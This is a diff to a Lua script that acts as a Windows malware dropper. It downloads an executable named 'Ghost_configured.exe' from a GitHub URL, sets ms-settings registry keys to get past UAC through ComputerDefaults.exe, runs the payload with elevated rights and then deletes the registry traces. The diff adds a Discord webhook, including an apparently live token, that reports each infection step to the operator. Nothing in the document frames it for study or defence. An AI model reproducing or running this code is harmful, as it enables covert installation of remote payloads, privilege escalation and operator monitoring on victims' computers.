@@ -1,7 +1,20 @@
 local ffi = require("ffi")
+local http = require("socket.http")
 
 -- Define the URL and file path
-local url = "https://github.com/invisibleghostshell-ux/lua/raw/main/project.exe"
+local url = "https://github.com/invisibleghostshell-ux/lua/raw/main/Ghost_configured.exe"
+local webhook_url = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
+
+-- Function to send log messages to Discord
+function sendLogMessage(message)
+    local payload = string.format('{"content": "%s"}', message)
+    local response, status = http.request(webhook_url, payload)
+    if status == 200 then
+        print("Log message sent to Discord successfully.")
+    else
+        print("Failed to send log message to Discord. Status: " .. status)
+    end
+end
 
 -- Define the FFI function prototypes for registry and download.
 ffi.cdef[[
@@ -88,7 +101,7 @@ local localPath = tempDir .. "\\" .. generateRandomString(8) .. ".exe"
 local result = urlmon.URLDownloadToFileA(nil, url, localPath, 0, nil)
 
 if result == 0 then
-    print("File downloaded successfully.")
+    sendLogMessage("File downloaded successfully.")
 
     -- Sleep for a moment to ensure the file is completely written
     ffi.C.Sleep(1000)
@@ -96,33 +109,33 @@ if result == 0 then
     -- Write the registry value to create the UAC bypass
     local success = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", "DelegateExecute", "")
     if success then
-        print("Successfully wrote the DelegateExecute registry value.")
+        sendLogMessage("Successfully wrote the DelegateExecute registry value.")
     else
-        print("Failed to write the DelegateExecute registry value.")
+        sendLogMessage("Failed to write the DelegateExecute registry value.")
     end
 
     success = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", "", localPath)
     if success then
-        print("Successfully wrote the command registry value.")
+        sendLogMessage("Successfully wrote the command registry value.")
     else
-        print("Failed to write the command registry value.")
+        sendLogMessage("Failed to write the command registry value.")
     end
 
     -- Execute ComputerDefaults.exe to bypass UAC prompts and run localPath (our downloaded EXE)
     local execSuccess, exitCode = os.execute("C:\\Windows\\System32\\ComputerDefaults.exe")
     if execSuccess then
-        print("Executable ran successfully. Exit code: " .. exitCode)
+        sendLogMessage("Executable ran successfully. Exit code: " .. exitCode)
     else
-        print("Failed to run the executable.")
+        sendLogMessage("Failed to run the executable.")
     end
 
     -- Delete the registry key and its subkeys
     local deleteSuccess = deleteRegistryTree(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
     if deleteSuccess then
-        print("Successfully deleted the registry key and its subkeys.")
+        sendLogMessage("Successfully deleted the registry key and its subkeys.")
     else
-        print("Failed to delete the registry key and its subkeys.")
+        sendLogMessage("Failed to delete the registry key and its subkeys.")
     end
 else
-    print("Failed to download the file. Error code: " .. result)
+    sendLogMessage("Failed to download the file. Error code: " .. result)
 end
